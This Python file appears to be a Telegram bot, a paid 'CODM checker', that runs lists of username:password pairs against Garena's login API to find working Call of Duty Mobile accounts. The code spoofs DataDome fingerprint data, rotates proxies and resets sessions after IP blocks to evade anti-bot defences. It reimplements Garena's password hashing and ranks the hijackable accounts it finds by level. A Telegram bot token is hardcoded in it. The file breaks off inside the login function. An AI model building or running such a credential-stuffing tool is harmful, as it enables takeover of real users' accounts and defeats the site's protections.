import os
import time
import shutil
import datetime
import random
import hashlib
import hmac
import sqlite3
import json
import logging
import urllib.parse
import signal
import threading
import uuid
import math
import re
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Event
from queue import Queue
from collections import defaultdict
from Crypto.Cipher import AES
import requests
import cloudscraper
import colorama
from colorama import Fore, Style, Back
from rich.console import Console, Group
from rich.panel import Panel
from rich.table import Table
from rich.box import Box, DOUBLE, HORIZONTALS, ROUNDED
from rich.live import Live
from datetime import datetime
from datetime import datetime, timezone
from datetime import datetime, timedelta
from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from fake_useragent import UserAgent
from flask import Flask, request  # <-- Siguraduhing nandoon itong 'request'

# I-import ang Flask para sa Webhook
app = Flask(__name__)

# > Bot Token Here - Change the Token_here below -
BOT_TOKEN = "8958085477:AAG2yNupkfEBc8trWvmYaN_nJLr5SqB4hqs"
TOKEN = BOT_TOKEN  # Gumawa ng alias para hindi mag-error ang code sa baba

bot = telebot.TeleBot(BOT_TOKEN, num_threads=30)

# > Admin ID Here - Change the 123456789 below -
ADMIN_IDS = [6733600097, 6733600097]
OWNER_ID = 6733600097

DATABASE_FILE = "database.db"

# ==========================================================
# DITO NAGSISIMULA YUNG MGA SUSUNOD MONG UTILS AT HANDLERS
# (Iwanan mo lang yung gitnang bahagi ng 3,700 lines mo rito...)
# ==========================================================

def get_percent(current, total):
    if total <= 0: return "0"
    return f"{(current / total) * 100:.1f}"
    
def dict_factory(cursor, row):
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d

def get_db():
    try:
        conn = sqlite3.connect(DATABASE_FILE, detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES, check_same_thread=False)
        conn.row_factory = dict_factory
        return conn
    except Exception as e:
        print(f"Database Connection Error: {e}")
        return None

def init_db():
    conn = get_db()
    if conn:
        cursor = conn.cursor()
        
        # 1. CREATE USERS TABLE
        cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                            user_id INTEGER PRIMARY KEY,
                            username TEXT,
                            total_checked INTEGER DEFAULT 0
                        )''')
        
        # Ligtas na pagkuha ng column names (kahit tuple o dictionary ang ibalik ng driver)
        cursor.execute("PRAGMA table_info(users)")
        rows = cursor.fetchall()
        columns = []
        for row in rows:
            if isinstance(row, dict):
                columns.append(row.get('name'))
            elif hasattr(row, 'keys') and 'name' in row.keys():
                columns.append(row['name'])
            else:
                columns.append(row[1]) # Fallback sa tuple index 1
        
        # Dagdag columns para sa Users
        if 'coins' not in columns:
            cursor.execute("ALTER TABLE users ADD COLUMN coins INTEGER DEFAULT 0")
        if 'suspended_until' not in columns:
            cursor.execute("ALTER TABLE users ADD COLUMN suspended_until DATETIME DEFAULT NULL")
        if 'suspend_reason' not in columns:
            cursor.execute("ALTER TABLE users ADD COLUMN suspend_reason TEXT DEFAULT NULL")
        if 'daily_ad_count' not in columns:
            cursor.execute("ALTER TABLE users ADD COLUMN daily_ad_count INTEGER DEFAULT 0")
        if 'last_ad_date' not in columns:
            cursor.execute("ALTER TABLE users ADD COLUMN last_ad_date DATE DEFAULT NULL")
        if 'daily_ad_coins' not in columns:
            cursor.execute("ALTER TABLE users ADD COLUMN daily_ad_coins INTEGER DEFAULT 0")
            
        # 2. CREATE FILES TABLE
        cursor.execute('''CREATE TABLE IF NOT EXISTS files (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            user_id INTEGER,
                            filename TEXT,
                            filepath TEXT,
                            date_uploaded DATETIME,
                            file_size INTEGER,
                            status TEXT DEFAULT 'Never Checked'
                        )''')
        
        cursor.execute("PRAGMA table_info(files)")
        file_rows = cursor.fetchall()
        file_columns = []
        for row in file_rows:
            if isinstance(row, dict):
                file_columns.append(row.get('name'))
            elif hasattr(row, 'keys') and 'name' in row.keys():
                file_columns.append(row['name'])
            else:
                file_columns.append(row[1])

        if 'checker_type' not in file_columns:
            cursor.execute("ALTER TABLE files ADD COLUMN checker_type TEXT DEFAULT 'CODM'")
                        
        # 3. CREATE OTHER TABLES
        cursor.execute('''CREATE TABLE IF NOT EXISTS download_links (
                            token TEXT PRIMARY KEY,
                            filepath TEXT,
                            expires_at DATETIME
                        )''')
                        
        cursor.execute('''CREATE TABLE IF NOT EXISTS invoices (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            user_id INTEGER,
                            username TEXT,
                            amount_php TEXT,
                            coins INTEGER,
                            status TEXT DEFAULT 'Pending',
                            receipt_file_id TEXT,
                            decline_reason TEXT,
                            created_at DATETIME
                        )''')
                        
        cursor.execute('''CREATE TABLE IF NOT EXISTS settings (
                            setting_key TEXT PRIMARY KEY,
                            setting_value TEXT
                        )''')
                        
        cursor.execute('''CREATE TABLE IF NOT EXISTS ad_tokens (
                            token TEXT PRIMARY KEY,
                            user_id INTEGER,
                            created_at DATETIME,
                            used BOOLEAN DEFAULT 0
                        )''')
                        
        # 4. DEFAULT SETTINGS SETUP
        cursor.execute("INSERT OR IGNORE INTO settings (setting_key, setting_value) VALUES ('maintenance', 'off')")
        cursor.execute("INSERT OR IGNORE INTO settings (setting_key, setting_value) VALUES ('proxy_status', 'off')")
        
        conn.commit()
        cursor.close()
        conn.close()
        print("✅ Database tables and columns verified successfully without errors!")

init_db()

colorama.init(autoreset=True)
console = Console()

class Colors:
    LIGHTGREEN_EX = colorama.Fore.LIGHTGREEN_EX
    WHITE = colorama.Fore.WHITE
    BLUE = colorama.Fore.BLUE
    GREEN = colorama.Fore.GREEN
    RED = colorama.Fore.RED
    CYAN = colorama.Fore.CYAN
    YELLOW = colorama.Fore.YELLOW
    MAGENTA = colorama.Fore.MAGENTA
    LIGHTBLACK_EX = colorama.Fore.LIGHTBLACK_EX
    RESET = colorama.Style.RESET_ALL 

THREAD_CONFIGS = {
    "1": {"name": "RECOMMENDED", "threads": 1, "delay": 0},
    "2": {"name": "FAST", "threads": 2, "delay": 0},
    "3": {"name": "SPEED PLUS", "threads": 5, "delay": 0},
    "4": {"name": "MAX SPEED", "threads": 10, "delay": 0}
}
        
stop_flags = {}
stop_events = {}
pause_flags = {}
active_checks = {}
error_refunds = {} 

class ColoredFormatter(logging.Formatter):
    COLORS = {
        'DEBUG': colorama.Fore.BLUE + colorama.Back.WHITE,
        'INFO': colorama.Fore.WHITE,
        'WARNING': colorama.Fore.YELLOW,
        'ERROR': colorama.Fore.RED,
        'CRITICAL': colorama.Fore.RED + colorama.Back.WHITE,
        'ORANGE': '\033[38;5;214m',
        'PURPLE': '\033[95m',
        'CYAN': '\033[96m',
        'SUCCESS': '\033[92m',
        'FAIL': '\033[91m'
    }

    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        if levelname in self.COLORS:
            record.msg = f"{self.COLORS[levelname]}{record.msg}{self.RESET}"
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.CRITICAL) 

logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("requests").setLevel(logging.CRITICAL)

def setup_user_container(user_id):
    user_dir = f'Containers/{user_id}'
    os.makedirs(user_dir, exist_ok=True)
    
    os.makedirs("Global_Assets/Proxy", exist_ok=True)
    global_proxy = "Global_Assets/Proxy/Proxy.txt"
    global_cookie = "Global_Assets/cookies.txt"
    
    if not os.path.exists(global_proxy):
        with open(global_proxy, 'w') as f: pass
    if not os.path.exists(global_cookie):
        with open(global_cookie, 'w') as f: pass

class ProxyManager:
    def __init__(self):
        self.proxy_file = 'Global_Assets/Proxy/Proxy.txt'
        self.proxies = []
        self.lock = threading.Lock()
        self.load_proxies()
        
    def load_proxies(self):
        if not os.path.exists(self.proxy_file):
            with open(self.proxy_file, 'w') as f:
                pass
        with open(self.proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    self.proxies.append(line)

    def has_proxies(self):
        with self.lock:
            return len(self.proxies) > 0

    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            proxy_str = random.choice(self.proxies)
            return self.format_proxy(proxy_str)
            
    def format_proxy(self, proxy_str):
        if proxy_str.startswith('socks5://'):
            proxy_str = proxy_str.replace('socks5://', 'socks5h://', 1)

        if "://" in proxy_str:
            return {'http': proxy_str, 'https': proxy_str}
        
        parts = proxy_str.split(':')
        if len(parts) == 4:
            ip, port, user, pw = parts
            proxy_url = f"http://{user}:{pw}@{ip}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
        elif len(parts) == 2:
            ip, port = parts
            proxy_url = f"http://{ip}:{port}"
            return {'http': proxy_url, 'https': proxy_url}
        
        return {'http': f"http://{proxy_str}", 'https': f"http://{proxy_str}"}

class CookieManager:
    def __init__(self):
        os.makedirs('Global_Assets', exist_ok=True)
        self.banned_file = 'Global_Assets/banned_cookies.txt'
        self.cookies_file = 'Global_Assets/cookies.txt'
        self.lock = threading.Lock()
        
        self.banned_cookies = set()
        self.load_banned_cookies()
        
    def load_banned_cookies(self):
        with self.lock:
            if os.path.exists(self.banned_file):
                with open(self.banned_file, 'r') as f:
                    self.banned_cookies = set(line.strip() for line in f if line.strip())
    
    def is_banned(self, cookie):
        with self.lock:
            return cookie in self.banned_cookies
    
    def mark_banned(self, cookie):
        with self.lock:
            self.banned_cookies.add(cookie)
            with open(self.banned_file, 'a') as f:
                f.write(cookie + '\n')
    
    def get_valid_cookie(self):
        with self.lock:
            if os.path.exists(self.cookies_file):
                with open(self.cookies_file, 'r') as f:
                    valid_cookies = [c for c in f.read().splitlines() 
                                   if c.strip() and c.strip() not in self.banned_cookies]
                if valid_cookies:
                    return random.choice(valid_cookies)
            return None

    def save_cookie(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name, cookie_value in cookies_dict.items():
                cookie_parts.append(f"{cookie_name}={cookie_value}")
            full_cookie = "; ".join(cookie_parts)
            
            with self.lock:
                if not full_cookie or full_cookie in self.banned_cookies:
                    return False
                existing_cookies = set()
                if os.path.exists(self.cookies_file):
                    with open(self.cookies_file, 'r') as f:
                        existing_cookies = set(line.strip() for line in f if line.strip())
                        
                if full_cookie not in existing_cookies:
                    with open(self.cookies_file, 'a') as f:
                        f.write(full_cookie + '\n')
                    return True
                return False 
        except Exception as e:
            return False

    def save_cookie_from_string(self, cookie_string):
        with self.lock:
            if not cookie_string or cookie_string in self.banned_cookies:
                return False
            existing_cookies = set()
            if os.path.exists(self.cookies_file):
                with open(self.cookies_file, 'r') as f:
                    existing_cookies = set(line.strip() for line in f if line.strip())
            if cookie_string not in existing_cookies:
                with open(self.cookies_file, 'a') as f:
                    f.write(cookie_string + '\n')
                return True
            return False

def get_datadome_cookie(session):
    url = 'https://dd.garena.com/js/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com',
        'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    }
    
    payload = {
        'jsData': json.dumps({
            "ttst":76.70000004768372,"ifov":False,"hc":4,"br_oh":824,"br_ow":1536,"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","wbd":False,"dp0":True,"tagpu":5.738121195951787,"wdif":False,"wdifrm":False,"npmtm":False,"br_h":738,"br_w":260,"isf":False,"nddc":1,"rs_h":864,"rs_w":1536,"rs_cd":24,"phe":False,"nm":False,"jsf":False,"lg":"en-US","pr":1.25,"ars_h":824,"ars_w":1536,"tz":-480,"str_ss":True,"str_ls":True,"str_idb":True,"str_odb":False,"plgod":False,"plg":5,"plgne":True,"plgre":True,"plgof":False,"plggt":False,"pltod":False,"hcovdr":False,"hcovdr2":False,"plovdr":False,"plovdr2":False,"ftsovdr":False,"ftsovdr2":False,"lb":False,"eva":33,"lo":False,"ts_mtp":0,"ts_tec":False,"ts_tsa":False,"vnd":"Google Inc.","bid":"NA","mmt":"application/pdf,text/pdf","plu":"PDF Viewer,Chrome PDF Viewer,Chromium PDF Viewer,Microsoft Edge PDF Viewer,WebKit built-in PDF","hdn":False,"awe":False,"geb":False,"dat":False,"med":"defined","aco":"probably","acots":False,"acmp":"probably","acmpts":True,"acw":"probably","acwts":False,"acma":"maybe","acmats":False,"acaa":"probably","acaats":True,"ac3":"","ac3ts":False,"acf":"probably","acfts":False,"acmp4":"maybe","acmp4ts":False,"acmp3":"probably","acmp3ts":False,"acwm":"maybe","acwmts":False,"ocpt":False,"vco":"","vcots":False,"vch":"probably","vchts":True,"vcw":"probably","vcwts":True,"vc3":"maybe","vc3ts":False,"vcmp":"","vcmpts":False,"vcq":"maybe","vcqts":False,"vc1":"probably","vc1ts":True,"dvm":8,"sqt":False,"so":"landscape-primary","bda":False,"wdw":True,"prm":True,"tzp":True,"cvs":True,"usb":True,"cap":True,"tbf":False,"lgs":True,"tpd":True
        }),
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '4.35.4'
    }

    data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()
        response_json = response.json()
        
        if response_json['status'] == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            datadome = cookie_string.split(';')[0].split('=')[1]
            return datadome
        else:
            return None
    except requests.exceptions.RequestException as e:
        return None
        
        
class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0
        self._403_lock = threading.Lock()
        
    def extract_full_cookie_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            cookie_parts = []
            for cookie_name, cookie_value in cookies_dict.items():
                cookie_parts.append(f"{cookie_name}={cookie_value}")
            return "; ".join(cookie_parts)
        except Exception as e:
            return None
        
    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)
            
    def get_datadome(self):
        return self.current_datadome
        
    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception as e:
            return None
        
    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception as e:
            pass
        
    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception as e:
            return False

    def get_current_ip(self):
        ip_services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']
        for service in ip_services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except Exception:
                pass
        return None
        
    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        original_ip = self.get_current_ip()
        if not original_ip:
            time.sleep(10)
            return True
        else:
            start_time = time.time()
            attempts = 0
            while time.time() - start_time < max_wait_time:
                attempts += 1
                current_ip = self.get_current_ip()
                if current_ip and current_ip != original_ip:
                    return True
                
                time.sleep(check_interval)
            return False
            
    def handle_403(self, session, account="", proxy_manager=None):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if proxy_manager and proxy_manager.has_proxies():
                self._403_attempts = 0
                return "reset_session"
            else:
                if self.wait_for_ip_change(session):
                    self._403_attempts = 0
                    new_datadome = get_datadome_cookie(session)
                    if new_datadome:
                        self.set_datadome(new_datadome)
                        return "reset_session"
                    else:
                        return "reset_session"
                else:
                    return False 
                       
        new_datadome = get_datadome_cookie(session)
        if new_datadome:
            self.set_datadome(new_datadome)
            return "refreshed"
        else: 
            return "failed"
    
    def reset_403_counter(self):
        with self._403_lock:
            self._403_attempts = 0


def generate_dashboard(processed, total, valid, invalid, current_account, current_status):
    percentage = (processed / total) * 100 if total > 0 else 0
    bar_length = 30
    filled = int((percentage / 100) * bar_length)
    empty = bar_length - filled
    bar = f"[cyan]{'━' * filled}[/cyan][dim white]{'━' * empty}[/dim white]"

    table = Table(box=None, show_header=False, padding=(0, 2), expand=True)
    table.add_column("Key", style="bold white", width=15)
    table.add_column("Value")

    table.add_row("Status Bar", f"{bar}  [bold cyan]{percentage:.1f}%[/bold cyan]")
    table.add_row("Status", f"[bold white]{processed:,}/{total:,}[/bold white]  |  [green]Valid: {valid:,}[/green]  |  [red]Invalid: {invalid:,}[/red]")
    table.add_row("Checking", f"[yellow]{current_account}[/yellow]")
    table.add_row("Result", f"{current_status}")

    panel = Panel(
        table, 
        title="[bold white]✧ SALTPAPI CODM CHECKER Status ✧[/bold white]", 
        border_style="cyan",
        box=ROUNDED
    )
    return Group(panel, "")

def worker(user_id, account_queue, results_queue, thread_config, cookie_manager, datadome_manager, live_stats, file_lock, proxy_manager=None, base_results_dir="Results", stop_event=None):
    try:
        session = cloudscraper.create_scraper()
        
        if proxy_manager and proxy_manager.has_proxies():
            proxy = proxy_manager.get_proxy()
            if proxy:
                session.proxies.update(proxy)
                
        initial_cookie = cookie_manager.get_valid_cookie()
        if initial_cookie:
            applyck(session, initial_cookie)
        
        while not account_queue.empty() and not stop_event.is_set():
            while pause_flags.get(user_id, False) and not stop_event.is_set():
                time.sleep(1)
                continue
                
            try:
                account_line = account_queue.get_nowait()
            except:
                break
                
            if ':' not in account_line:
                results_queue.put(("skip", account_line, "Invalid format"))
                account_queue.task_done()
                continue
                
            account, password = account_line.split(':', 1)
            account, password = account.strip(), password.strip()
            
            try:
                max_retries = 3
                retry_count = 0
                
                while retry_count <= max_retries and not stop_event.is_set():
                    status_type, payload = checking_system(user_id, session, account, password, cookie_manager, datadome_manager, live_stats, proxy_manager, base_results_dir)
                    
                    if status_type == "success":
                        # Payload is now a dictionary
                        panel = payload.get('panel')
                        formatted_log = payload.get('log')
                        results_queue.put(("success", account_line, (panel, formatted_log)))
                        break # Labas na sa retry loop kapag success
                        
                    elif status_type == "reset_session":
                        results_queue.put(("rotating", account_line, "IP BLOCKED / Waiting"))
                        retry_count += 1
                        if retry_count <= max_retries:
                            session = reset_session_and_cookies(session, cookie_manager, datadome_manager, proxy_manager)
                            time.sleep(1)
                            continue
                        else:
                            save_403_accounts(user_id, account, password)
                            results_queue.put(("error", account_line, "IP Blocked Saved for Retry"))
                            if user_id in error_refunds:
                                error_refunds[user_id] += 1
                            break
                    else:
                        results_queue.put((status_type, account_line, payload))
                        if status_type == "error" and user_id in error_refunds:
                            error_refunds[user_id] += 1
                        break
                
                if status_type == "reset_session" and retry_count > max_retries:
                    save_403_accounts(user_id, account, password)
                    results_queue.put(("error", account_line, "Max Retries Reached for IP Block"))
                    if user_id in error_refunds:
                        error_refunds[user_id] += 1
                
            except Exception as e:
                save_403_accounts(user_id, account, password)
                results_queue.put(("error", account_line, f"Exception {str(e)}"))
                if user_id in error_refunds:
                    error_refunds[user_id] += 1
            
            if thread_config["delay"] > 0:
                time.sleep(thread_config["delay"])
                
            account_queue.task_done()
    except Exception as e:
        pass
    finally:
        try:
            session.close()
        except:
            pass
        
def reset_session_and_cookies(session, cookie_manager, datadome_manager, proxy_manager=None):
    try:
        session.close()
        new_session = cloudscraper.create_scraper()
        
        if proxy_manager and proxy_manager.has_proxies():
            proxy = proxy_manager.get_proxy()
            if proxy:
                new_session.proxies.update(proxy)
                
        new_session.cookies.clear()
        fresh_datadome = get_datadome_cookie(new_session)
        if fresh_datadome:
            datadome_manager.set_datadome(fresh_datadome)
            datadome_manager.set_session_datadome(new_session, fresh_datadome)
        initial_cookie = cookie_manager.get_valid_cookie()
        if initial_cookie:
            applyck(new_session, initial_cookie)
        datadome_manager.reset_403_counter()
        new_session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
        return new_session
        
    except Exception as e:
        return session 

class LiveStats:
    def __init__(self):
        self.lock = Lock()
        self.stats = {
            'valid': 0, 'invalid': 0, 'clean': 0, 
            'not_clean': 0, 'has_codm': 0, 'no_codm': 0
        }
        # Bagong variables para sa Top Clean Account Hit
        self.top_clean_level = 0
        self.top_clean_account = "None"

        # Dito ise-save ang bilang bawat level range
        self.levels = {
            '1-50': 0, '51-100': 0, '101-150': 0, '151-200': 0,
            '201-250': 0, '251-300': 0, '301-350': 0, '351+': 0
        }
        # Dito ise-save ang bilang bawat server
        self.servers = {
            'PH': 0, 'TH': 0, 'ID': 0, 'VN': 0, 'MY': 0, 'US': 0
        }

    def update_stats(self, valid=False, clean=False, has_codm=False, level=0, server='N/A', account_line=""):
        with self.lock:
            if valid:
                self.stats['valid'] += 1
                if clean: 
                    self.stats['clean'] += 1
                    # HAKBANG 1.2: Kung clean account AT may CODM, i-check kung ito ang pinakamataas na level
                    if has_codm:
                        try:
                            lvl = int(level)
                            if lvl > self.top_clean_level:
                                self.top_clean_level = lvl
                                self.top_clean_account = account_line # Format: user:pass
                        except: pass
                else: 
                    self.stats['not_clean'] += 1
                
                if has_codm:
                    self.stats['has_codm'] += 1
                    # Logic para sa Level Distribution
                    try:
                        lvl = int(level)
                        if 1 <= lvl <= 50: self.levels['1-50'] += 1
                        elif 51 <= lvl <= 100: self.levels['51-100'] += 1
                        elif 101 <= lvl <= 150: self.levels['101-150'] += 1
                        elif 151 <= lvl <= 200: self.levels['151-200'] += 1
                        elif 201 <= lvl <= 250: self.levels['201-250'] += 1
                        elif 251 <= lvl <= 300: self.levels['251-300'] += 1
                        elif 301 <= lvl <= 350: self.levels['301-350'] += 1
                        elif lvl > 350: self.levels['351+'] += 1
                    except: pass

                    # Logic para sa Server Distribution
                    srv = str(server).upper().strip()
                    if srv in self.servers:
                        self.servers[srv] += 1
                else:
                    self.stats['no_codm'] += 1
            else:
                self.stats['invalid'] += 1

    def get_stats(self, full=False):
        with self.lock:
            # Kung tahasang hiningi ang full (gaya ng sa Live UI natin), ibabalik lahat ng 5
            if full:
                return self.stats.copy(), self.levels.copy(), self.servers.copy(), self.top_clean_level, self.top_clean_account
            
            # DEFAULT FALLBACK: Kung hindi hiningi, 3 lang ang ibabalik para sa mga lumang code
            return self.stats.copy(), self.levels.copy(), self.servers.copy()
            
def encode(plaintext, key):
    key = bytes.fromhex(key)
    plaintext = bytes.fromhex(plaintext)
    cipher = AES.new(key, AES.MODE_ECB)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext.hex()[:32]

def get_passmd5(password):
    decoded_password = urllib.parse.unquote(password)
    return hashlib.md5(decoded_password.encode('utf-8')).hexdigest()

def hash_password(password, v1, v2):
    passmd5 = get_passmd5(password)
    inner_hash = hashlib.sha256((passmd5 + v1).encode()).hexdigest()
    outer_hash = hashlib.sha256((inner_hash + v2).encode()).hexdigest()
    return encode(passmd5, outer_hash)

def applyck(session, cookie_str):
    session.cookies.clear()
    cookie_dict = {}
    for item in cookie_str.split(";"):
        item = item.strip()
        if '=' in item:
            try:
                key, value = item.split("=", 1)
                key = key.strip()
                value = value.strip()
                if key and value:
                    cookie_dict[key] = value
            except (ValueError, IndexError):
                pass
        else:
            pass
    if cookie_dict:
        session.cookies.update(cookie_dict)

def prelogin(session, account, datadome_manager, proxy_manager=None, retries=3):
    for attempt in range(retries):
        try:
            url = 'https://sso.garena.com/api/prelogin'
            params = {
                'app_id': '10100',
                'account': account,
                'format': 'json',
                'id': str(int(time.time() * 1000))
            }
            
            current_cookies = session.cookies.get_dict()
            cookie_parts = []
            
            for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
                if cookie_name in current_cookies:
                    cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
            
            cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br, zstd',
                'accept-language': 'en-US,en;q=0.9',
                'connection': 'keep-alive',
                'host': 'sso.garena.com',
                'referer': f'https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account={account}',
                'sec-ch-ua': '"Google Chrome";v="133", "Chromium";v="133", "Not=A?Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
            }
            
            if cookie_header:
                headers['cookie'] = cookie_header
                        
            response = session.get(url, headers=headers, params=params, timeout=30)
            
            new_cookies = {}
            
            if 'set-cookie' in response.headers:
                set_cookie_header = response.headers['set-cookie']
                
                for cookie_str in set_cookie_header.split(','):
                    if '=' in cookie_str:
                        try:
                            cookie_name = cookie_str.split('=')[0].strip()
                            cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                            if cookie_name and cookie_value:
                                new_cookies[cookie_name] = cookie_value
                        except Exception as e:
                            pass
            
            try:
                response_cookies = response.cookies.get_dict()
                for cookie_name, cookie_value in response_cookies.items():
                    if cookie_name not in new_cookies:
                        new_cookies[cookie_name] = cookie_value
            except Exception as e:
                pass
            
            for cookie_name, cookie_value in new_cookies.items():
                if cookie_name in ['datadome', 'apple_state_key', 'sso_key']:
                    session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                    if cookie_name == 'datadome':
                        datadome_manager.set_datadome(cookie_value)
            
            new_datadome = new_cookies.get('datadome')
            
            if response.status_code == 403:  
                result = datadome_manager.handle_403(session, account, proxy_manager)
                if result == "reset_session":
                    return "reset_session", None, None, "IP BLOCKED"
                
                if new_cookies and attempt < retries - 1:
                    time.sleep(2)
                    continue
                    
                if result == "refreshed":
                    return "save_for_retry", None, new_datadome, "IP BLOCKED"
                else:
                    return "save_for_retry", None, new_datadome, "IP BLOCKED"
            
            response.raise_for_status()
            
            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return "save_for_retry", None, new_datadome, "PRELOGIN JSON ERROR"
            
            if 'error' in data:
                error_msg = data['error']
                if error_msg == "error_user_ban":
                    return None, None, new_datadome, "BANNED"
                elif error_msg == "error_no_account":
                    return None, None, new_datadome, "DOES NOT EXIST"
                elif error_msg == "error_auth":
                    return None, None, new_datadome, "AUTH FAILED"
                elif error_msg == "error_security_ban":
                    return None, None, new_datadome, "SECURITY BANNED"
                else:                
                    if attempt < retries - 1:
                        time.sleep(2)
                        continue
                    return "save_for_retry", None, new_datadome, f"PRELOGIN {error_msg}"
                
            v1 = data.get('v1')
            v2 = data.get('v2')
            
            if not v1 or not v2:
                return None, None, new_datadome, "MISSING V1 or V2"
                
            datadome_manager.reset_403_counter()
            return v1, v2, new_datadome, "SUCCESS"
            
        except requests.exceptions.HTTPError as e:
            if hasattr(e, 'response') and e.response is not None:
                if e.response.status_code == 403:
                    new_cookies = {}
                    if 'set-cookie' in e.response.headers:
                        set_cookie_header = e.response.headers['set-cookie']
                        for cookie_str in set_cookie_header.split(','):
                            if '=' in cookie_str:
                                try:
                                    cookie_name = cookie_str.split('=')[0].strip()
                                    cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                                    if cookie_name and cookie_value:
                                        new_cookies[cookie_name] = cookie_value
                                        session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
                                        if cookie_name == 'datadome':
                                            datadome_manager.set_datadome(cookie_value)
                                except Exception as ex:
                                    pass
                    
                    result = datadome_manager.handle_403(session, account, proxy_manager)
                    if result == "reset_session":
                        return "reset_session", None, None, "IP BLOCKED"
                    
                    if new_cookies and attempt < retries - 1:
                         time.sleep(2)
                         continue
                    
                    return "save_for_retry", None, new_cookies.get('datadome'), "IP BLOCKED"
            if attempt < retries - 1:
                time.sleep(2)
                continue
        except Exception as e:           
            if attempt < retries - 1:
                time.sleep(2)
                continue 
    return "save_for_retry", None, None, "MAX RETRIES REACHED"

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)
    url = 'https://sso.garena.com/api/login'
    params = {
        'app_id': '10100',
        'account': account,
        'password': hashed_password,
        'redirect_uri': 'https://account.garena.com/',
        'format': 'json',
        'id': str(int(time.time() * 1000))
    }
    
